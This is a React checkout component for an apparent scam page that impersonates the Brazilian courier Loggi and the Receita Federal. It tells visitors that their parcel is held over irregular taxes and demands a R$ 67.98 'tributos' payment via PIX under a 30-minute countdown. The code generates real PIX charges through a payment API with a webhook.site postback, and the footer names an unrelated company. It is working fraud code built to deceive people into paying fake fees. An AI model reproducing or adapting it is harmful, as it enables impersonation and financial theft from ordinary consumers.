import { motion, AnimatePresence } from "framer-motion";
import { ArrowLeft, Package, ShieldCheck, Clock, AlertTriangle, User, Copy, CheckCircle2, RefreshCw, Loader2, QrCode } from "lucide-react";
import { useState, useEffect, useRef } from "react";
import loggiLogo from "@/assets/loggi-logo.png";
import receitaLogo from "@/assets/receita-logo.png";

interface CheckoutProps {
  trackingCode: string;
  userName: string;
  maskedCpf: string;
  onBack: () => void;
}

const TOTAL = 67.98;

const taxValue = 27.50;
const handlingFee = 15.98;
const icms = 24.50;

type PixStatus = "idle" | "loading" | "success" | "error" | "paid";

const CheckoutSection = ({ trackingCode, userName, maskedCpf, onBack }: CheckoutProps) => {
  const [timeLeft, setTimeLeft] = useState(1800);
  const [pixStatus, setPixStatus] = useState<PixStatus>("idle");
  const [pixPayload, setPixPayload] = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [copied, setCopied] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [qrUrl, setQrUrl] = useState("");
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, []);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const cleanDoc = (doc: string) => doc.replace(/\D/g, "");

  const gerarPix = async () => {
    setPixStatus("loading");
    setErrorMsg("");
    try {
      const cpfRaw = cleanDoc(maskedCpf.replace(/\*/g, "0"));
      const cpf = cpfRaw.length === 11 ? cpfRaw : "24125439095";
      const amountCents = Math.round(TOTAL * 100);

      const body = {
        amount: amountCents,
        payment_method: "pix",
        postback_url: "https://webhook.site/freepay-loggi",
        customer: {
          name: userName,
          email: "cliente@email.com",
          phone: "11999999999",
          document: {
            type: "cpf",
            number: cpf,
          },
        },
        items: [
          {
            title: "Taxa de Tributação Loggi",
            description: `Tributos referente ao objeto ${trackingCode}`,
            unit_price: amountCents,
            quantity: 1,
          },
        ],
        metadata: { provider_name: "Loggi" },
        ip: "177.0.0.1",
      };

      const response = await fetch("/.netlify/functions/criar-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data?.message || data?.Message || `Erro ${response.status}: ${JSON.stringify(data)}`);
      }

      const txData = data?.data;
      if (!txData) throw new Error(`Resposta inesperada: ${JSON.stringify(data)}`);

      const pixObj = txData?.pix;
      const payload: string = pixObj?.qr_code || "";
      if (!payload) throw new Error("Código PIX não retornado pela API");

      const txId: string = txData?.id || "";

      setPixPayload(payload);
      setTransactionId(txId);
      setQrUrl(`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(payload)}`);
      setPixStatus("success");

      if (txId) {
        pollingRef.current = setInterval(async () => {
          try {
            const r = await fetch(`/.netlify/functions/status-pix?id=${txId}`);
            const d = await r.json();
            const status: string = d?.Status || d?.status || "";
            if (status === "PAID") {
              setPixStatus("paid");
              if (pollingRef.current) clearInterval(pollingRef.current);
            }
          } catch {
            // silently continue polling
          }
        }, 5000);
      }
    } catch (e: unknown) {
      setPixStatus("error");
      setErrorMsg(e instanceof Error ? e.message : "Erro desconhecido");
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(pixPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <section>
      {/* Loggi bar */}
      <div className="w-full py-3.5 px-4 flex items-center justify-center" style={{ background: "#00AEEF", borderBottom: "1px solid #0099CC" }}>
        <img src={loggiLogo} alt="Loggi" className="h-14 w-auto" style={{ filter: "brightness(0) invert(1)" }} />
      </div>
      {/* SSL bar */}
      <div className="w-full py-2 px-4 flex items-center justify-center gap-2 text-xs font-semibold tracking-wide" style={{ background: "#0099CC", color: "#ffffff" }}>
        <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        <span>Conexão Segura SSL • Pagamento Oficial Loggi ✓</span>
      </div>
      {/* Header */}
      <div className="w-full" style={{ background: "hsl(var(--navy))" }}>
        <div className="mx-auto flex max-w-3xl items-center justify-between px-5 py-4">
          <div className="flex items-center gap-3">
            <img src={receitaLogo} alt="Receita Federal" className="h-12 w-auto rounded-md" />
          </div>
          <div className="text-right">
            <div className="text-sm font-semibold tracking-wide text-primary-foreground">Minhas Importações</div>
            <div className="flex items-center justify-end gap-1.5 text-xs mt-1" style={{ color: "rgba(255,255,255,0.7)" }}>
              <span className="dot-online" />
              <span>Pagamento Seguro</span>
            </div>
          </div>
        </div>
      </div>

      <div style={{ background: "#f0f0ee" }} className="pb-16 pt-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="mx-auto max-w-lg px-4">

          <div className="flex items-center gap-2 text-[10px] text-muted-foreground mb-6">
            <span>Minhas Importações</span>
            <span>›</span>
            <span>Despacho Postal</span>
            <span>›</span>
            <span className="font-semibold text-foreground">Pagamento</span>
          </div>

          <h1 className="text-xl font-bold text-foreground mb-1">Pagamento de Tributos</h1>
          <p className="text-xs text-muted-foreground mb-6">Regularize a tributação para liberação da sua encomenda</p>

          {/* Timer */}
          <div className="rounded-xl overflow-hidden mb-5 bg-card" style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.1)" }}>
            <div className="flex items-center justify-between px-4 py-3" style={{ background: "hsl(0, 80%, 96%)", borderBottom: "1px solid hsl(0, 50%, 90%)" }}>
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4" style={{ color: "hsl(var(--destructive))" }} />
                <span className="text-xs font-semibold" style={{ color: "hsl(var(--destructive))" }}>Tempo restante para pagamento</span>
              </div>
              <span className="text-sm font-bold font-mono" style={{ color: "hsl(var(--destructive))" }}>{formatTime(timeLeft)}</span>
            </div>
          </div>

          {/* Info Card */}
          <div className="rounded-xl overflow-hidden mb-5 bg-card" style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.1)" }}>
            <div className="px-5 py-4" style={{ background: "hsl(var(--navy))" }}>
              <div className="flex items-center gap-2">
                <Package className="h-4 w-4 text-primary-foreground" />
                <span className="text-sm font-bold text-primary-foreground">Resumo da Tributação</span>
              </div>
            </div>
            <div className="p-5">
              <div className="mb-4 pb-4" style={{ borderBottom: "1px solid hsl(var(--border))" }}>
                <p className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-2">Destinatário</p>
                <div className="flex items-center gap-3">
                  <div className="flex h-10 w-10 items-center justify-center rounded-full" style={{ background: "hsl(210, 60%, 95%)" }}>
                    <User className="h-4 w-4" style={{ color: "hsl(207, 44%, 49%)" }} />
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-foreground">{userName}</p>
                    <p className="text-xs text-muted-foreground">CPF: {maskedCpf}</p>
                  </div>
                </div>
              </div>


              <div className="mb-4 pb-4" style={{ borderBottom: "1px solid hsl(var(--border))" }}>
                <p className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-2">Objeto Postal</p>
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-semibold text-foreground">{trackingCode}</p>
                  </div>
                  <span className="text-[10px] font-bold px-2.5 py-1 rounded-full" style={{ background: "hsl(0, 80%, 96%)", color: "hsl(var(--destructive))" }}>TRIBUTADO</span>
                </div>
              </div>

              <div className="mb-4 pb-4 space-y-2" style={{ borderBottom: "1px solid hsl(var(--border))" }}>
                <p className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-2">Situação</p>
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Situação Cadastral</span>
                  <span className="font-semibold" style={{ color: "hsl(var(--destructive))" }}>Irregular</span>
                </div>
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Status da Encomenda</span>
                  <span className="font-semibold" style={{ color: "hsl(var(--destructive))" }}>Retida</span>
                </div>
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Prazo para Regularização</span>
                  <span className="font-semibold" style={{ color: "hsl(var(--destructive))" }}>48 horas</span>
                </div>
              </div>


              <div className="mb-4">
                <p className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-3">Detalhamento dos Tributos</p>
                <div className="space-y-2.5">
                  <div className="flex justify-between text-xs">
                    <span className="text-muted-foreground">Imposto de Importação (II)</span>
                    <span className="font-semibold text-foreground">R$ {taxValue.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-xs">
                    <span className="text-muted-foreground">Despacho Postal</span>
                    <span className="font-semibold text-foreground">R$ {handlingFee.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-xs">
                    <span className="text-muted-foreground">ICMS Estadual</span>
                    <span className="font-semibold text-foreground">R$ {icms.toFixed(2)}</span>
                  </div>
                </div>
              </div>

              <div className="rounded-lg p-4" style={{ background: "hsl(210, 60%, 95%)", border: "1px solid hsl(210, 40%, 88%)" }}>
                <div className="flex justify-between items-center">
                  <span className="text-sm font-bold text-foreground">Total a Pagar</span>
                  <span className="text-xl font-bold" style={{ color: "hsl(var(--navy))" }}>R$ {TOTAL.toFixed(2)}</span>
                </div>
              </div>
            </div>
          </div>

          {/* PIX Card */}
          <div className="rounded-xl overflow-hidden mb-5 bg-card" style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.1)" }}>
            <div className="px-5 py-4" style={{ background: "hsl(var(--navy))" }}>
              <div className="flex items-center gap-2">
                <QrCode className="h-4 w-4 text-primary-foreground" />
                <span className="text-sm font-bold text-primary-foreground">Pagar via PIX</span>
              </div>
            </div>
            <div className="p-5">
              <AnimatePresence mode="wait">
                {pixStatus === "idle" && (
                  <motion.div key="idle" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                    <div className="rounded-lg p-4 mb-4" style={{ background: "hsl(210, 60%, 95%)", border: "1px solid hsl(210, 40%, 88%)" }}>
                      <p className="text-xs text-muted-foreground leading-relaxed">
                        Clique no botão abaixo para gerar o código PIX e o QR Code para pagamento imediato da encomenda <span className="font-semibold text-foreground">{trackingCode}</span>.
                      </p>
                    </div>
                    <button onClick={gerarPix} className="btn-consultar" style={{ background: "hsl(var(--navy))" }}>
                      <QrCode className="h-4 w-4" />
                      Gerar PIX — R$ {TOTAL.toFixed(2)}
                    </button>
                  </motion.div>
                )}

                {pixStatus === "loading" && (
                  <motion.div key="loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="flex flex-col items-center gap-3 py-8">
                    <Loader2 className="h-8 w-8 animate-spin" style={{ color: "hsl(var(--navy))" }} />
                    <p className="text-xs text-muted-foreground font-medium">Gerando seu PIX...</p>
                  </motion.div>
                )}

                {pixStatus === "error" && (
                  <motion.div key="error" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                    <div className="rounded-lg p-4 mb-4 flex items-start gap-3" style={{ background: "hsl(0, 80%, 96%)", border: "1px solid hsl(0, 50%, 85%)" }}>
                      <AlertTriangle className="h-4 w-4 shrink-0 mt-0.5" style={{ color: "hsl(var(--destructive))" }} />
                      <div>
                        <p className="text-xs font-semibold" style={{ color: "hsl(var(--destructive))" }}>Erro ao gerar PIX</p>
                        <p className="text-[11px] text-muted-foreground mt-1">{errorMsg}</p>
                      </div>
                    </div>
                    <button onClick={gerarPix} className="btn-consultar" style={{ background: "hsl(var(--navy))" }}>
                      <RefreshCw className="h-4 w-4" />
                      Tentar novamente
                    </button>
                  </motion.div>
                )}

                {pixStatus === "success" && (
                  <motion.div key="success" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
                    <div className="rounded-lg p-3 mb-4" style={{ background: "hsl(145, 60%, 96%)", border: "1px solid hsl(145, 40%, 82%)" }}>
                      <p className="text-[11px] font-semibold mb-1" style={{ color: "hsl(145, 60%, 30%)" }}>✓ PIX gerado com sucesso!</p>
                      <p className="text-[11px] text-muted-foreground">Escaneie o QR Code ou copie o código abaixo para pagar.</p>
                    </div>

                    <div className="flex flex-col items-center mb-4">
                      <div className="rounded-xl p-3 bg-white" style={{ border: "2px solid hsl(var(--border))", boxShadow: "0 2px 12px rgba(0,0,0,0.08)" }}>
                        {qrUrl ? (
                          <img src={qrUrl} alt="QR Code PIX" className="w-48 h-48" />
                        ) : (
                          <div className="w-48 h-48 flex items-center justify-center">
                            <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
                          </div>
                        )}
                      </div>
                      <p className="text-[10px] text-muted-foreground mt-2">QR Code válido por 30 minutos</p>
                    </div>

                    <div className="flex items-center gap-3 mb-4">
                      <div className="flex-1 h-px" style={{ background: "hsl(var(--border))" }} />
                      <span className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">ou copie o código</span>
                      <div className="flex-1 h-px" style={{ background: "hsl(var(--border))" }} />
                    </div>

                    <div className="rounded-lg p-3 mb-3 break-all" style={{ background: "hsl(210, 20%, 97%)", border: "1px solid hsl(var(--border))" }}>
                      <p className="text-[10px] font-mono text-muted-foreground leading-relaxed select-all">{pixPayload}</p>
                    </div>

                    <button
                      onClick={handleCopy}
                      className="btn-consultar mb-3"
                      style={{ background: copied ? "hsl(145, 60%, 42%)" : "hsl(var(--navy))" }}
                    >
                      {copied ? <CheckCircle2 className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                      {copied ? "Copiado!" : "Copiar Código PIX"}
                    </button>

                    <div className="flex items-center justify-center gap-2 py-2">
                      <Loader2 className="h-3.5 w-3.5 animate-spin text-muted-foreground" />
                      <span className="text-[11px] text-muted-foreground">Aguardando confirmação do pagamento...</span>
                    </div>

                    {transactionId && (
                      <p className="text-[10px] text-center text-muted-foreground mt-1">ID: {transactionId}</p>
                    )}
                  </motion.div>
                )}

                {pixStatus === "paid" && (
                  <motion.div key="paid" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} className="flex flex-col items-center gap-4 py-6">
                    <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", duration: 0.5 }}>
                      <CheckCircle2 className="h-16 w-16" style={{ color: "hsl(145, 60%, 42%)" }} />
                    </motion.div>
                    <div className="text-center">
                      <p className="text-base font-bold text-foreground">Pagamento Confirmado!</p>
                      <p className="text-xs text-muted-foreground mt-1">Seu pagamento foi aprovado. A encomenda será liberada em breve.</p>
                    </div>
                    <div className="rounded-lg p-3 w-full text-center" style={{ background: "hsl(145, 60%, 96%)", border: "1px solid hsl(145, 40%, 82%)" }}>
                      <p className="text-xs font-semibold" style={{ color: "hsl(145, 60%, 30%)" }}>Encomenda: {trackingCode}</p>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              <p className="text-[10px] text-center text-muted-foreground mt-3 flex items-center justify-center gap-1">
                <ShieldCheck className="h-3 w-3" />
                Pagamento processado em ambiente seguro
              </p>
            </div>
          </div>

          {/* Security info */}
          <div className="rounded-xl overflow-hidden mb-5 bg-card p-4" style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.1)" }}>
            <div className="flex items-start gap-3">
              <ShieldCheck className="h-5 w-5 shrink-0 mt-0.5" style={{ color: "hsl(145, 60%, 42%)" }} />
              <div>
                <p className="text-xs font-bold text-foreground">Ambiente de Pagamento Seguro</p>
                <p className="text-[10px] text-muted-foreground mt-1 leading-relaxed">
                  Este pagamento é processado de forma segura pela Loggi. Seus dados são protegidos por criptografia de ponta a ponta.
                </p>
              </div>
            </div>
          </div>

          <div className="h-1.5 rounded-full mb-6" style={{ background: "linear-gradient(90deg, hsl(var(--navy-dark)), hsl(var(--navy)), hsl(var(--navy-dark)))" }} />

          <button
            className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground w-full hover:text-foreground transition-colors"
            onClick={onBack}
          >
            <ArrowLeft className="h-3.5 w-3.5" />
            Voltar
          </button>
        </motion.div>
      </div>

      {/* Rodapé Loggi */}
      <div className="w-full py-6 px-4" style={{ background: "#00AEEF", borderTop: "3px solid #0099CC" }}>
        <div className="mx-auto max-w-3xl">
          <div className="flex items-center justify-center gap-3 mb-3">
            <img src={loggiLogo} alt="Loggi" className="h-10 w-auto" style={{ filter: "brightness(0) invert(1)" }} />
          </div>
          <div className="text-center text-xs leading-relaxed" style={{ color: "#ffffff" }}>
            <p className="font-bold mb-1">Santo Andre Construtora e Incorporadora LTDA</p>
            <p>CNPJ: 07.828.839/0001-61</p>
            <p className="mt-1">Endereço: Avenida Antonio Artioli 570, 570 - Campinas - SP</p>
            <p className="mt-2 text-[10px]" style={{ color: "rgba(255,255,255,0.5)" }}>
              © {new Date().getFullYear()} Todos os direitos reservados.
            </p>
          </div>
        </div>
      </div>
    </section>
  );
};

export default CheckoutSection;
